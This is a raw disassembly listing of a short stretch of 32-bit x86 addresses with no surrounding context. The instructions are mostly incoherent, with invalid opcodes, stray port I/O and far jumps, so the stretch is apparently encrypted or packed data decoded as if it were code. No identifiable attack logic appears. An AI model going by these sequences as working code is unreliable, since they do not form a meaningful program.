  40e9ba:	call   0xd4f7968a
  40e9bf:	loope  0x40e976
  40e9c1:	mov    dh,0xf0
  40e9c3:	mov    ebx,0xf2c2d1fc
  40e9c8:	(bad)  
  40e9c9:	not    edi
  40e9cb:	cli    
  40e9cc:	fdivr  st(7),st
  40e9ce:	add    al,0xd6
  40e9d0:	(bad)  
  40e9d1:	jecxz  0x40e99a
  40e9d3:	(bad)
  40e9d6:	add    edx,esp
  40e9d8:	repnz out dx,eax
  40e9da:	lods   eax,DWORD PTR ds:[esi]
  40e9db:	shl    edx,1
  40e9dd:	mov    dl,0xe1
  40e9df:	mov    ah,0xd7
  40e9e1:	int3   
  40e9e2:	mov    edx,0xded6b9d2
  40e9e7:	sar    eax,1
  40e9e9:	mov    esi,0xe50b00e3
  40e9ee:	retf   
  40e9ef:	add    eax,0xeede0ae4
  40e9f4:	or     ch,bh
  40e9f6:	jmp    0x40e9d6
  40e9f8:	rcr    esp,cl
  40e9fa:	(bad)  
  40e9fb:	repz repz ror esp,1
  40e9ff:	mov    cl,0xcb
  40ea01:	iret   
  40ea02:	icebp  
  40ea03:	hlt    
  40ea04:	test   cl,0xbc
  40ea07:	(bad)  
  40ea08:	pop    es
  40ea09:	faddp  st(0),st
  40ea0b:	icebp  
  40ea0c:	jmp    0x40ea0d
  40ea0e:	loope  0x40ea01
  40ea10:	(bad)  
  40ea12:	out    dx,al
  40ea13:	mov    DWORD PTR [edx],0xcaeacadd
  40ea19:	ret    
  40ea1a:	in     eax,dx
  40ea1b:	(bad)  
  40ea1c:	xlat   BYTE PTR ds:[ebx]
  40ea1d:	jecxz  0x40e9ff
  40ea1f:	mov    ebx,0xe9f7b9bb
  40ea24:	out    dx,al
  40ea25:	fcmove st,st(1)
  40ea27:	add    esp,edx
  40ea29:	loopne 0x40e9fd
  40ea2b:	clc    
  40ea2c:	add    eax,DWORD PTR [edx]
  40ea2e:	rol    ah,cl
  40ea30:	or     eax,DWORD PTR ds:0xcfdcafa
  40ea36:	add    ecx,esp
  40ea38:	scas   eax,DWORD PTR es:[edi]
  40ea39:	loope  0x40e9ed
  40ea3b:	rcl    dh,1
  40ea3d:	test   eax,0xbac6baf1
  40ea42:	(bad)  
  40ea43:	in     al,dx
  40ea44:	int    0xf5
  40ea46:	ret    
  40ea47:	hlt    
  40ea48:	fdiv   st,st(5)
  40ea4a:	fcmovu st,st(0)
  40ea4c:	mov    ebp,0xd4daf9f6
  40ea51:	add    eax,0xd902d90f
  40ea56:	jmp    0xd2d3:0xd7f3d8b8
  40ea5d:	enter  0xe7cc,0xcf
  40ea61:	mov    edi,0xcdf4e4d2
  40ea66:	call   0xf643cc69
  40ea6b:	add    al,0x7
  40ea6d:	jmp    0xe0ff:0xc5f5e9e5
  40ea74:	retf   
  40ea75:	enter  0xbc0f,0xc1
  40ea79:	jecxz  0x40ea3e
  40ea7b:	lods   eax,DWORD PTR ds:[esi]
  40ea7c:	mul    esi
  40ea7e:	aam    0xcd
  40ea80:	mov    edx,0xf0b4d3c6
  40ea85:	cmc    
  40ea86:	fcmovne st,st(1)
  40ea88:	stc    
  40ea89:	mov    eax,0xfdfcfee7
  40ea8e:	std    
  40ea8f:	(bad)  
  40ea92:	(bad)  
  40ea93:	int    0xc9
  40ea95:	fiadd  WORD PTR ds:0xc6ceaebc
  40ea9b:	(bad)  
  40ea9c:	int    0xb5
  40ea9e:	xlat   BYTE PTR ds:[ebx]
  40ea9f:	clc    
  40eaa0:	aad    0xce
  40eaa2:	(bad)  
  40eaa4:	mov    ch,0xd6
  40eaa6:	leave  
  40eaa7:	sar    DWORD PTR [eax-0x4541121a],1
  40eaad:	idiv   BYTE PTR [edi+ebx*8-0x262a393f]
  40eab4:	(bad)  ds:0xcebfa913
  40eaba:	mov    al,0xad
  40eabc:	ror    ebp,cl
  40eabe:	loopne 0x40ea8f
  40eac0:	in     al,0xf6
  40eac2:	int3   
  40eac3:	clc    
  40eac4:	retf   
  40eac5:	shr    esp,1
  40eac7:	shl    ebx,cl
  40eac9:	test   dl,0xf9
  40eacc:	fcomip st,st(7)
  40eace:	cli    
  40eacf:	fucom  st(4)
  40ead1:	out    dx,al
  40ead2:	or     bl,cl
  40ead4:	loop   0x40eac8
  40ead6:	or     DWORD PTR [edi-0x503d2c3e],ebp
  40eadc:	fsubr  st(4),st
  40eade:	loopne 0x40eac4
  40eae0:	test   ch,0xbb
  40eae3:	enter  0xeef8,0xdc
  40eae7:	mov    edi,0xccbdbc03
  40eaec:	mov    esp,0xfd05d00a
  40eaf1:	push   cs
  40eaf2:	in     eax,0xc5
  40eaf4:	aam    0xdd
  40eaf6:	push   es
  40eaf7:	mov    cl,0xb8
  40eaf9:	mov    esp,0xf5bce6cb
  40eafe:	mov    bl,0xca
  40eb00:	stc    
  40eb01:	div    al
  40eb03:	mov    ch,0xf3
  40eb05:	loop   0x40eac0
  40eb07:	in     al,dx
  40eb08:	loopne 0x40eae6
  40eb0a:	fdiv   st(4),st
  40eb0c:	ffreep st(2)
  40eb0e:	(bad)  
  40eb0f:	out    0xd4,eax
  40eb11:	push   es
  40eb12:	or     eax,0xeae3fbfa
  40eb17:	mov    edi,0xcee8f6b0
  40eb1c:	ret    0xcdcd
  40eb1f:	retf   
  40eb20:	iret   
  40eb21:	jmp    0x40eaec
  40eb23:	ror    eax,cl
  40eb25:	fidivr WORD PTR [eax+ebp*8+0x5e0d0e3]
  40eb2c:	pop    es
  40eb2d:	ffreep st(7)
  40eb2f:	loopne 0x40eaf1
  40eb31:	add    ch,al
  40eb33:	in     eax,dx
  40eb34:	loope  0x40eb16
  40eb36:	jecxz  0x40eb2a
  40eb38:	stos   BYTE PTR es:[edi],al
  40eb39:	retf   0xddb2
  40eb3c:	jmp    0xee25d33b
  40eb41:	(bad)  
  40eb42:	fsubr  st,st(4)
  40eb44:	fnclex 
  40eb46:	fdivr  st,st(2)
  40eb48:	mov    eax,0xd2d5d0ef
  40eb4d:	loope  0x40eb50
  40eb4f:	std    
  40eb50:	sti    
  40eb51:	jmp    0x40eb2d
  40eb53:	or     BYTE PTR [eax],cl
  40eb55:	push   es
  40eb56:	rcl    cl,0xd8
  40eb59:	mov    bl,0xd5
  40eb5b:	rcr    ah,0xeb
  40eb5e:	mov    dh,0xfb
  40eb60:	iret   
  40eb61:	imul   ch
  40eb63:	sti    
  40eb64:	std    
  40eb65:	int    0xb4
  40eb67:	int    0xfc
  40eb69:	fadd   QWORD PTR [esi]
  40eb6b:	(bad)  
  40eb6d:	fcmovnu st,st(4)
  40eb6f:	loope  0x40eb73
  40eb71:	pop    es
  40eb72:	or     ebx,ebp
  40eb74:	add    eax,0xa9eb0cee
  40eb79:	(bad)
  40eb7c:	loopne 0x40eb45
  40eb7e:	loop   0x40eb77
  40eb80:	int3   
  40eb81:	(bad)  
  40eb82:	mov    ebx,0xcff2bad8
  40eb87:	icebp  
  40eb88:	repnz fdiv DWORD PTR [esi+esi*8-0x2235fd06]
  40eb90:	sti    
  40eb91:	(bad)  
  40eb92:	jmp    0x40eba3
  40eb94:	or     BYTE PTR [edx+ecx*1],al
  40eb97:	jecxz  0x40eb77
  40eb99:	shl    edi,0xe8
  40eb9c:	into   
  40eb9d:	(bad)  
  40eb9e:	call   0xff2bd36b
  40eba3:	leave  
  40eba4:	hlt    
  40eba5:	mov    eax,0xf700ffc3
  40ebaa:	out    dx,al
  40ebab:	add    BYTE PTR [esp+eax*1+0x603c105],bh
  40ebb2:	(bad)  
  40ebb3:	retf   0x8da
  40ebb6:	push   es
  40ebb7:	mov    edi,0xb6b1c7bd
  40ebbc:	int    0xb3
  40ebbe:	in     al,0xb1
  40ebc0:	cmc    
  40ebc1:	stc    
  40ebc2:	fcomp  st(7)
  40ebc4:	out    dx,al
  40ebc5:	call   ecx
  40ebc7:	rol    eax,0xf5
  40ebca:	lock mul dh
  40ebcd:	(bad)  
  40ebcf:	call   0xee07eea4
  40ebd4:	fsubr  st,st(3)
  40ebd6:	fsub   st(6),st
  40ebd8:	test   al,0xd7
  40ebda:	loopne 0x40eb8e
  40ebdc:	fsubr  st(7),st
  40ebde:	aad    0xdb
  40ebe0:	lock retf 
  40ebe2:	idiv   DWORD PTR [edi-0x311e0914]
  40ebe8:	out    dx,al
  40ebe9:	stc    
  40ebea:	int3   
  40ebeb:	ret    0xfde3
  40ebee:	add    ecx,DWORD PTR [edx]
  40ebf0:	ffree  st(1)
  40ebf2:	out    dx,al
  40ebf3:	(bad)  
  40ebf5:	in     al,dx
  40ebf6:	call   0xf7edbfca
  40ebfb:	les    edi,FWORD PTR [ebx+ecx*8-0x15074512]
  40ec02:	jmp    0x40ebf2
  40ec04:	std    
  40ec05:	retf   0xe3db
  40ec08:	iret   
  40ec09:	fadd   DWORD PTR [ecx]
  40ec0b:	mov    edi,0xd4e4f90b
  40ec10:	leave  
  40ec11:	add    al,0x0
  40ec13:	loope  0x40ebf7
  40ec15:	retf   
  40ec16:	in     eax,0xe4
  40ec18:	test   eax,0xf4e6c0d2
  40ec1d:	rcr    edx,cl
  40ec1f:	shl    esp,0xeb
  40ec22:	iret   
  40ec23:	(bad)  
  40ec24:	mov    edx,0xbcc1bbff
  40ec29:	neg    eax
  40ec2b:	(bad)  
  40ec2c:	neg    cl
  40ec2e:	lock jmp 0xdd4ffb43
  40ec34:	fimul  DWORD PTR [ecx]
  40ec36:	or     eax,0xace7d7f0
  40ec3b:	ret    0xedc5
  40ec3e:	in     eax,0xd8
  40ec40:	shl    eax,cl
  40ec42:	clc    
  40ec43:	sti    
  40ec44:	rcr    edx,1
  40ec46:	div    ah
  40ec48:	loope  0x40ec24
  40ec4a:	fsubrp st(7),st
  40ec4c:	mov    esi,0xf9e5d4c6
  40ec51:	dec    cl
  40ec53:	out    dx,al
  40ec54:	add    esp,esi
  40ec56:	add    ebp,ecx
  40ec58:	retf   
  40ec59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec5a:	lods   eax,DWORD PTR ds:[esi]
  40ec5b:	iret   
  40ec5c:	mov    cl,0xd5
  40ec5e:	out    dx,al
  40ec5f:	clc    
  40ec60:	aam    0xf6
  40ec62:	stc    
  40ec63:	fucomip st,st(2)
  40ec65:	retf   
  40ec66:	fdivr  st,st(5)
  40ec68:	icebp  
  40ec69:	add    edx,edi
  40ec6b:	mov    esi,0xffd5f9e0
  40ec70:	add    eax,0xdcddd8de
  40ec75:	cld    
  40ec76:	jmp    0xb3ca:0xecd3d1c5
  40ec7d:	in     eax,0xef
  40ec7f:	in     eax,0xd8
  40ec81:	mov    cl,0xb6
  40ec83:	lock div cl
  40ec86:	mov    ebx,0xc0b8f9d6
  40ec8b:	icebp  
  40ec8c:	fmul   st,st(3)
  40ec8e:	(bad)  
  40ec8f:	fstp   TBYTE PTR [esi+0x13e607d6]
  40ec95:	(bad)  
  40ec98:	scas   al,BYTE PTR es:[edi]
  40ec99:	mov    bl,0xd3
  40ec9b:	ret    0xcefb
  40ec9e:	fldz   
  40eca0:	in     al,dx
  40eca1:	int    0xac
  40eca3:	(bad)
  40eca6:	fidivr WORD PTR [esi-0x43040011]
  40ecac:	add    al,BYTE PTR [eax]
  40ecae:	test   BYTE PTR [eax],0xd5
  40ecb1:	leave  
  40ecb2:	fmul   QWORD PTR [ecx]
  40ecb4:	in     al,dx
  40ecb5:	adc    edi,eax
  40ecb7:	jmp    0xaefed98c
  40ecbc:	ret    0xd4ef
  40ecbf:	mov    bh,0xfb
  40ecc1:	shl    cl,cl
  40ecc3:	retf   
  40ecc4:	mov    ch,0xb8
  40ecc6:	(bad)  
  40ecc8:	fdivr  st(5),st
  40ecca:	jecxz  0x40ec92
  40eccc:	lock (bad) 
  40ecce:	sar    bh,1
  40ecd0:	fimul  DWORD PTR [ebx]
  40ecd2:	or     esp,ecx
  40ecd4:	or     eax,0xacc7fd0e
  40ecd9:	lods   eax,DWORD PTR ds:[esi]
  40ecda:	in     eax,0xe6
  40ecdc:	repz loopne 0x40ec9f
  40ecdf:	clc    
  40ece0:	loopne 0x40ecda
  40ece2:	(bad)  
  40ece3:	(bad)  
  40ece4:	mov    ecx,0xd2c2d9f0
  40ece9:	add    dl,ch
  40eceb:	sti    
  40ecec:	inc    eax
  40ecee:	xlat   BYTE PTR ds:[ebx]
  40ecef:	fld    st(6)
  40ecf1:	cli    
  40ecf2:	ror    al,0xe3
  40ecf5:	(bad)
  40ecf8:	mov    al,0xf1
  40ecfa:	xlat   BYTE PTR ds:[ebx]
  40ecfb:	jmp    0xf205a8c1
  40ed00:	aad    0xea
  40ed02:	rcr    esp,1
  40ed04:	fdivr  QWORD PTR [edi-0x32232d18]
  40ed0a:	xlat   BYTE PTR ds:[ebx]
  40ed0b:	(bad)  
  40ed0d:	jecxz  0x40eccb
  40ed0f:	push   es
  40ed10:	xlat   BYTE PTR ds:[ebx]
  40ed11:	fsub   st(3),st
  40ed13:	jmp    0x40ed24
  40ed15:	retf   0xf206
  40ed18:	shl    DWORD PTR [ebx-0x3d2f323d],0xac
  40ed1f:	mov    ecx,0xbbb9d7db
  40ed24:	jecxz  0x40ecfb
  40ed26:	leave  
  40ed27:	fcmove st,st(6)
  40ed29:	aad    0xc0
  40ed2b:	loop   0x40ed18
  40ed2d:	fstp   st(1)
  40ed2f:	ret    
  40ed30:	add    al,0xe4
  40ed32:	jmp    0x40ed3a
  40ed34:	in     al,dx
  40ed35:	jmp    0xe7b6:0xcde4e211
  40ed3c:	int    0xfb
  40ed3e:	int3   
  40ed3f:	rol    eax,1
  40ed41:	call   0xf01be8fe
  40ed46:	not    ah
  40ed48:	xlat   BYTE PTR ds:[ebx]
  40ed49:	into   
  40ed4a:	(bad)  
  40ed4b:	fcomp  st(2)
  40ed4d:	rcr    al,cl
  40ed4f:	jmp    0x40ed5a
  40ed51:	stc    
  40ed52:	call   0x434bb21
  40ed57:	out    dx,eax
  40ed58:	int    0xd3
  40ed5a:	mov    ebp,0xc5e3e2af
  40ed5f:	leave  
  40ed60:	icebp  
  40ed61:	lock push DWORD PTR [edx+ecx*8-0x45482641]
  40ed69:	rol    BYTE PTR [edx],1
  40ed6b:	(bad)  
  40ed6c:	lds    ecx,FWORD PTR [ebx]
  40ed6e:	repnz add al,0x2
  40ed71:	jmp    0x40ed81
  40ed73:	in     eax,0xf4
  40ed75:	adc    eax,eax
  40ed77:	loope  0x40ed64
  40ed79:	in     al,dx
  40ed7a:	mov    esp,0xe0a9fbc4
  40ed7f:	stc    
  40ed80:	mul    bh
  40ed82:	(bad)  
  40ed84:	repnz clc 
  40ed86:	(bad)  
  40ed88:	(bad)  
  40ed89:	loope  0x40ed7c
  40ed8b:	(bad)
  40ed8e:	mov    eax,0xddfd7fc
  40ed93:	fcmovu st,st(4)
  40ed95:	out    0xe6,eax
  40ed97:	mov    cl,0xa9
  40ed99:	mov    al,0xb3
  40ed9b:	enter  0xceb1,0xcf
  40ed9f:	loopne 0x40ed7a
  40eda1:	enter  0xddc5,0xc4
  40eda5:	mov    ah,0xd2
  40eda7:	sar    al,cl
  40eda9:	mov    esi,0xddf3fd07
  40edae:	push   es
  40edaf:	loopne 0x40ed8c
  40edb1:	fiadd  DWORD PTR [edi+eax*1]
  40edb4:	in     al,dx
  40edb5:	add    bl,ah
  40edb7:	scas   eax,DWORD PTR es:[edi]
  40edb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb9:	into   
  40edba:	jecxz  0x40ed92
  40edbc:	jmp    0xf0d9:0xebf6c9e3
  40edc3:	mov    edi,0xfefbd8b5
  40edc8:	loope  0x40edab
  40edca:	loopne 0x40edae
  40edcc:	in     al,0xd3
  40edce:	(bad)  
  40edcf:	clc    
  40edd0:	out    0xe4,al
  40edd2:	jmp    0xfd02d3de
  40edd7:	out    0xc2,eax
  40edd9:	scas   eax,DWORD PTR es:[edi]
  40edda:	jmp    0xe911b2ad
  40eddf:	call   0xd2f9c1a9
  40ede4:	mov    dl,0xd5
  40ede6:	into   
  40ede7:	out    dx,eax
  40ede8:	hlt    
  40ede9:	add    ecx,ebp
  40edeb:	clc    
  40edec:	sar    DWORD PTR [esp+esi*8-0x1f37411d],1
  40edf3:	or     eax,0xd30ae3ce
  40edf8:	(bad)  
  40edfa:	out    dx,al
  40edfb:	icebp  
  40edfc:	jmp    0xbeef:0xdad2e7c0
  40ee03:	icebp  
  40ee04:	mov    ecx,0x1dacaf2
  40ee09:	(bad)  
  40ee0b:	add    BYTE PTR [esi-0x2062e3f],bh
  40ee11:	(bad)  
  40ee13:	add    ebx,esp
  40ee15:	(bad)  
  40ee17:	lods   al,BYTE PTR ds:[esi]
  40ee18:	mov    ebp,0xd5e4b7f6
  40ee1d:	(bad)  
  40ee1f:	fcmovnu st,st(1)
  40ee21:	in     eax,0xb8
  40ee23:	mov    ecx,0xbcd0ffb4
  40ee28:	fucomp st(4)
  40ee2a:	fidivr DWORD PTR [esi+0x3d9f802]
  40ee30:	(bad)  
  40ee31:	aam    0x6
  40ee33:	enter  0xdec,0xef
  40ee37:	int    0xb1
  40ee39:	enter  0xf7bd,0xc0
  40ee3d:	mov    dl,0xba
  40ee3f:	out    0xce,eax
  40ee41:	cli    
  40ee42:	mov    edx,0xf5ede4d4
  40ee47:	mov    edi,0xe6f8f5c2
  40ee4c:	shl    ch,0xc2
  40ee4f:	fsqrt  
  40ee51:	aad    0xef
  40ee53:	out    dx,al
  40ee54:	add    eax,0xb0a9eec8
  40ee59:	mov    ebp,0xadaed0b1
  40ee5e:	sar    BYTE PTR [edx-0x35163034],cl
  40ee64:	sar    BYTE PTR [eax-0x303c2e22],1
  40ee6a:	std    
  40ee6b:	mov    ebp,0xc0d0e7d3
  40ee70:	add    ecx,ecx
  40ee72:	add    BYTE PTR [edi],al
  40ee74:	cli    
  40ee75:	add    edx,ebx
  40ee77:	ret    0xc3e8
  40ee7a:	ret    0xcbc9
  40ee7d:	(bad)  
  40ee7e:	test   al,0xb6
  40ee80:	jmp    0xb0c8:0xd5ddc8b8
  40ee87:	fstp   TBYTE PTR [esp+edi*4-0x191f4304]
  40ee8e:	(bad)  
  40ee90:	add    eax,0xf4ff0bd4
  40ee95:	clc    
  40ee96:	out    dx,eax
  40ee97:	int    0xaf
  40ee99:	mov    cl,0xe3
  40ee9b:	ret    0xfbd5
  40ee9e:	imul   cl
  40eea0:	out    dx,al
  40eea1:	sti    
  40eea2:	fbstp  TBYTE PTR [ebx-0xc051509]
  40eea8:	mov    edi,0xd4bdd0dc
  40eead:	clc    
  40eeae:	add    ebp,eax
  40eeb0:	call   0xdc3dddbc
  40eeb5:	out    0xe1,al
  40eeb7:	(bad)  
  40eeb9:	ret    0xe2d2
  40eebc:	out    0xc9,al
  40eebe:	mov    bh,0xe9
  40eec0:	shl    ch,1
  40eec2:	aam    0xb7
  40eec4:	mov    ah,0xbd
  40eec6:	rol    DWORD PTR [ecx],cl
  40eec8:	ret    0xffbd
  40eecb:	clc    
  40eecc:	out    0xdb,eax
  40eece:	sti    
  40eecf:	mov    ah,0xa
  40eed2:	(bad)  
  40eed3:	fld    QWORD PTR [ebx+eiz*8]
  40eed6:	(bad)  
  40eed8:	ret    0xe6e0
  40eedb:	in     eax,0xcf
  40eedd:	int3   
  40eede:	jmp    0xdf2d9f9d
  40eee3:	icebp  
  40eee4:	enter  0xf9ca,0xf7
  40eee8:	mov    esi,0xf3fd01d3
  40eeed:	fxch   st(2)
  40eeef:	leave  
  40eef0:	mov    esi,0xdfa06e4
  40eef5:	(bad)  
  40eef7:	out    0xe5,al
  40eef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eefa:	(bad)  
  40eefb:	mov    al,0xc5
  40eefd:	sar    ebx,1
  40eeff:	cli    
  40ef00:	mov    eax,0xe8ebfed0
  40ef05:	retf   0x2d4
  40ef08:	push   esi
  40ef0a:	ret    0xd6e1
  40ef0d:	repnz (bad) 
  40ef0f:	aad    0xe8
  40ef11:	(bad)  
  40ef13:	fisttp WORD PTR [ecx]
  40ef15:	call   0xee22c30b
  40ef1a:	aad    0xd6
  40ef1c:	aad    0xc3
  40ef1e:	out    0xb4,eax
  40ef20:	test   esp,0xd5cff7f0
  40ef26:	clc    
  40ef27:	fsub   st,st(3)
  40ef29:	cld    
  40ef2a:	mov    ebp,0xd5fbd1fc
  40ef2f:	fcmovnu st,st(7)
  40ef31:	fisttp WORD PTR [eax]
  40ef33:	fld    DWORD PTR [ebx]
  40ef35:	call   0xbeeeb338
  40ef3a:	call   0xd80cd0ee
  40ef3f:	in     eax,dx
  40ef40:	idiv   dh
  40ef42:	clc    
  40ef43:	not    ah
  40ef45:	retf   0x1fb
  40ef48:	ror    edi,1
  40ef4a:	clc    
  40ef4b:	add    eax,0x4e9c6e4
  40ef50:	jmp    eax
  40ef52:	ror    dl,0xf4
  40ef55:	add    ch,ah
  40ef57:	iret   
  40ef58:	repz mov bl,0xc7
  40ef5b:	iret   
  40ef5c:	mov    esp,0xd4b1cde2
  40ef61:	mov    bh,0xac
  40ef63:	into   
  40ef64:	repz clc 
  40ef66:	jmp    0xf821f357
  40ef6b:	mov    ebx,0xe8c6d2f6
  40ef70:	jecxz  0x40ef74
  40ef72:	out    dx,al
  40ef73:	hlt    
  40ef74:	retf   
  40ef75:	or     eax,0xd0d8ccfe
  40ef7a:	lods   al,BYTE PTR ds:[esi]
  40ef7b:	xlat   BYTE PTR ds:[ebx]
  40ef7c:	vfnmsub213sd xmm7,xmm5,xmm1
  40ef81:	leave  
  40ef82:	stc    
  40ef83:	jmp    0xeff9:0xfdbbfcbf
  40ef8a:	pop    es
  40ef8b:	int3   
  40ef8c:	loop   0x40ef4e
  40ef8e:	add    dh,ah
  40ef90:	(bad)  
  40ef91:	iret   
  40ef92:	out    0xd9,al
  40ef94:	fptan  
  40ef96:	fucom  st(7)
  40ef98:	scas   eax,DWORD PTR es:[edi]
  40ef99:	ret    0xb0c7
  40ef9c:	mov    dh,0xc7
  40ef9e:	mov    cl,0xf4
  40efa0:	aam    0xdb
  40efa2:	rcr    esi,cl
  40efa4:	out    dx,al
  40efa5:	in     al,dx
  40efa6:	idiv   BYTE PTR [edx-0x1e1d3246]
  40efac:	clc    
  40efad:	fadd   DWORD PTR [esi]
  40efaf:	add    eax,DWORD PTR [ebx]
  40efb1:	retf   
  40efb2:	out    dx,al
  40efb3:	clc    
  40efb4:	sti    
  40efb5:	dec    DWORD PTR [ecx]
  40efb7:	in     al,dx
  40efb8:	call   0xe501dca1
  40efbd:	in     eax,0xc9
  40efbf:	aam    0xd8
  40efc1:	shr    bl,1
  40efc3:	stc    
  40efc4:	sti    
  40efc5:	leave  
  40efc6:	repz test ah,0xc0
  40efca:	rol    edx,1
  40efcc:	mov    ebp,0xf5d7b80a
  40efd1:	or     esp,ecx
  40efd3:	out    dx,eax
  40efd4:	retf   0xe6d8
  40efd7:	out    0xb8,eax
  40efd9:	shl    eax,0xf2
  40efdc:	in     al,0xc7
  40efde:	int    0xca
  40efe0:	mov    dl,0xcd
  40efe2:	(bad)  
  40efe3:	out    dx,eax
  40efe4:	int    0xfd
  40efe6:	mov    ecx,0xe0d0d5fc
  40efeb:	aam    0xcc
  40efed:	(bad)  
  40efee:	or     al,ch
  40eff0:	in     eax,0x8
  40eff2:	loopne 0x40efec
  40eff4:	cli    
  40eff5:	(bad)  
  40eff7:	fadd   st(4),st
  40eff9:	shl    BYTE PTR [eax+esi*8-0x4e17532a],1
  40f000:	shl    DWORD PTR [edi-0x42262f37],1
  40f006:	mov    ebx,0xf901ddfc
  40f00b:	rol    BYTE PTR [ebx],1
  40f00d:	mov    ecx,0xd8d0d507
  40f012:	add    eax,0x9e403e1
  40f017:	loopne 0x40eff9
  40f019:	div    bh
  40f01b:	lock leave 
  40f01d:	sar    DWORD PTR [ebx-0x1b2f3033],1
  40f023:	div    BYTE PTR [ebp-0x2b2b264f]
  40f029:	mov    edi,0xc403c7cd
  40f02e:	icebp  
  40f02f:	f2xm1  
  40f031:	sti    
  40f032:	(bad)  
  40f033:	in     al,0xa
  40f035:	fsubrp st(6),st
  40f037:	mov    eax,0xb2d5c6c1
  40f03c:	int    0xea
  40f03e:	lods   al,BYTE PTR ds:[esi]
  40f03f:	out    dx,eax
  40f040:	in     eax,dx
  40f041:	not    esi
  40f043:	(bad)  
  40f044:	rcl    edx,cl
  40f046:	(bad)  
  40f048:	rcl    bh,1
  40f04a:	std    
  40f04b:	std    
  40f04c:	fcmovnbe st,st(1)
  40f04e:	fisttp QWORD PTR [edx]
  40f050:	leave  
  40f051:	out    dx,al
  40f052:	loopne 0x40f01d
  40f054:	push   cs
  40f055:	jmp    0x40f03d
  40f057:	(bad)  
  40f059:	repnz loope 0x40f03f
  40f05c:	shl    ecx,cl
  40f05e:	rcl    ecx,cl
  40f060:	loopne 0x40f05c
  40f062:	aam    0xf5
  40f064:	stc    
  40f065:	ret    
  40f066:	fucom  st(0)
  40f068:	add    dh,dl
  40f06a:	mov    DWORD PTR ds:0xf903e4d9,0xdae5faff
  40f074:	loope  0x40f081
  40f076:	inc    bh
  40f078:	mov    eax,0xdbc3cacd
  40f07d:	mul    ah
  40f07f:	fdivr  DWORD PTR [ecx-0x4d093701]
  40f085:	int3   
  40f086:	shl    ch,1
  40f088:	in     al,dx
  40f089:	aad    0xfb
  40f08b:	mov    ebp,0xf5f9bcd2
  40f090:	retf   
  40f091:	add    bh,cl
  40f093:	clc    
  40f094:	add    ch,bh
  40f096:	or     eax,0xe2e7d0c0
  40f09b:	shl    bh,cl
  40f09d:	cmc    
  40f09e:	int    0xb9
  40f0a0:	mov    ecx,0xf4ceb7e6
  40f0a5:	mov    ah,0xe8
  40f0a7:	fptan  
  40f0a9:	(bad)  
  40f0aa:	sar    DWORD PTR [esi+0x3fbb9d2],1
  40f0b0:	fsub   st(1),st
  40f0b2:	mov    bh,0xdb
  40f0b5:	in     al,0xb
  40f0b7:	rol    ebx,cl
  40f0b9:	in     al,0xe1
  40f0bb:	mov    dh,0xca
  40f0bd:	hlt    
  40f0be:	enter  0xcaf8,0xc8
  40f0c2:	mov    ecx,0xccdce3cf
  40f0c7:	fucomip st,st(6)
  40f0c9:	shl    ecx,1
  40f0cb:	pop    es
  40f0cc:	pop    es
  40f0cd:	in     eax,0x9
  40f0cf:	hlt    
  40f0d0:	out    dx,eax
  40f0d1:	neg    ah
  40f0d3:	dec    DWORD PTR [eax]
  40f0d5:	(bad)  
  40f0d7:	mov    ebp,0xb2e7bebc
  40f0dc:	ret    0xd6db
  40f0df:	leave  
  40f0e0:	jmp    0xdd00aade
  40f0e5:	into   
  40f0e6:	cld    
  40f0e7:	jmp    0xd401e3c4
  40f0ec:	std    
  40f0ed:	ret    
  40f0ee:	clc    
  40f0ef:	call   0xda23e8f9
  40f0f4:	add    esi,ebp
  40f0f6:	shr    bh,cl
  40f0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f9:	test   al,0xbc
  40f0fb:	leave  
  40f0fc:	lods   al,BYTE PTR ds:[esi]
  40f0fd:	rcr    ebx,1
  40f0ff:	(bad)  
  40f100:	lock aad 0xf6
  40f103:	(bad)  
  40f104:	not    al
  40f106:	lock cld 
  40f108:	int    0xec
  40f10a:	rcr    esp,1
  40f10c:	shl    eax,cl
  40f10e:	aad    0x1
  40f110:	in     al,0xd7
  40f112:	loopne 0x40f0e1
  40f114:	fsubr  st(1),st
  40f116:	retf   
  40f117:	leave  
  40f118:	lock mov cl,0xe5
  40f11b:	ror    ah,0xf6
  40f11e:	(bad)  
  40f11f:	fcomi  st,st(7)
  40f121:	mov    ah,0xf8
  40f123:	hlt    
  40f124:	leave  
  40f125:	out    dx,eax
  40f126:	mov    esp,0xd6fdf9f3
  40f12b:	fiadd  WORD PTR [edi+eiz*8]
  40f12e:	out    0xc2,al
  40f130:	mov    esi,0xc50804e2
  40f135:	adc    ch,al
  40f137:	lods   al,BYTE PTR ds:[esi]
  40f138:	stos   BYTE PTR es:[edi],al
  40f139:	iret   
  40f13a:	iret   
  40f13b:	shl    BYTE PTR [ecx-0xc2e0b30],cl
  40f141:	fcmovu st,st(0)
  40f143:	xlat   BYTE PTR ds:[ebx]
  40f144:	int3   
  40f145:	(bad)  
  40f147:	fcmovnbe st,st(2)
  40f149:	add    bl,al
  40f14b:	jecxz  0x40f114
  40f14d:	pop    es
  40f14e:	(bad)  
  40f150:	add    DWORD PTR [edi],ecx
  40f152:	in     al,0xe
  40f154:	fsubrp st(5),st
  40f156:	in     eax,dx
  40f157:	test   eax,0xcbb1acc9
  40f15c:	shl    BYTE PTR [esi-0x26261639],1
  40f162:	dec    ebx
  40f164:	int3   
  40f165:	jmp    0xfece:0xd9eef903
  40f16c:	fcomip st,st(3)
  40f16e:	mov    eax,0xddd8d7f4
  40f173:	or     ebp,esp
  40f175:	jmp    0xa5f4d665
  40f17a:	ret    
  40f17b:	lock lock shr ecx,0xf1
  40f180:	out    dx,al
  40f181:	in     eax,dx
  40f182:	jmp    0x33bc65b
  40f187:	leave  
  40f188:	loop   0x40f178
  40f18a:	out    0xc3,al
  40f18c:	fcmovnbe st,st(4)
  40f18e:	(bad)  
  40f190:	add    DWORD PTR [ebx],ecx
  40f192:	or     dl,bh
  40f194:	iret   
  40f195:	push   cs
  40f196:	in     al,dx
  40f197:	(bad)  
  40f198:	jmp    0xf6ee:0xf5b0e4c1
  40f19f:	aam    0xb8
  40f1a1:	fcomi  st,st(0)
  40f1a3:	fscale 
  40f1a5:	retf   0xddf4
  40f1a8:	add    DWORD PTR [edx],eax
  40f1aa:	mov    dh,0x6
  40f1ad:	fisttp DWORD PTR [ebx]
  40f1af:	out    0x7,eax
  40f1b1:	stc    
  40f1b2:	(bad)
  40f1b5:	call   0xc0edd0ba
